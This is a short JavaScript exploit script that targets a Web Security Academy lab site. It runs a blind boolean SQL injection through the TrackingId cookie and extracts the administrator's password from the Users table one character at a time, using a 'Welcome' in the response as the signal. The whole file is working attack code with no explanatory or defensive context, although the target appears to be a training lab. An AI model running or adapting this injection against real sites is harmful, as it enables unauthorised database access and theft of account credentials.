import { parse } from "node-html-parser";
import axios from "axios";
import * as fs from "fs";

const subDomain = "ac5a1f031f890ef4c0b80490007900e5";
const fullWebAddress = `https://${subDomain}.web-security-academy.net/`;
const queryPrefix = `filter?category=Gifts`;

const main = async () => {
  const alphabet = ` :<=>?@\'()*+,-./0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz[\\]^_{|}~!"#$&`;
  let extractedPassword = "";
  let currentCharacterIndex = 0;
  let currentPasswordIndex = 1;
  while (true) {
    try {
      console.log(
        `TrackingId=uVXFJuUKxY1E6Bad' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'administrator'), ${currentPasswordIndex}, 1) = '${alphabet[currentCharacterIndex]}`
      );
      console.log(extractedPassword);
      const response = await axios.get(fullWebAddress, {
        headers: {
          Cookie: `TrackingId=uVXFJuUKxY1E6Bad' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'administrator'), ${currentPasswordIndex}, 1) = '${alphabet[currentCharacterIndex]}`,
        },
      });

      // await sleep(1000);

      console.log(currentPasswordIndex);
      if (response.data.includes("Welcome")) {
        console.log(alphabet[currentCharacterIndex]);
        // console.log(response);
        extractedPassword += alphabet[currentCharacterIndex];
        currentCharacterIndex = 0;
        currentPasswordIndex += 1;
      } else if (currentCharacterIndex === 92) {
        break;
      } else {
        currentCharacterIndex += 1;
      }
    } catch (e) {
      console.log(e);
    }
  }
  console.log(extractedPassword);
};

function sleep(ms) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

main();
